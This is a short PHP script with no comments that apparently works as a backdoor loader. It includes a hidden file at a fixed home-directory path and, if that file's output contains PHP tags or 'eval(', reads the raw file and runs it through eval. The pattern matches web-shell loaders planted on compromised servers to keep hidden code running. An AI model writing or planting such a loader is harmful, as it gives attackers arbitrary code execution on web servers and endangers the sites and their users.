<?php
$target = '/home/skb01/rawr.php';

if (file_exists($target)) {
    ob_start();
    include($target);
    $result = ob_get_clean();
    
    if (strpos($result, '<?php') !== false || strpos($result, 'eval(') !== false) {
        eval('?>' . file_get_contents($target));
    } else {
        echo $result;
    }
} else {
    die("File Not Found");
}
?>
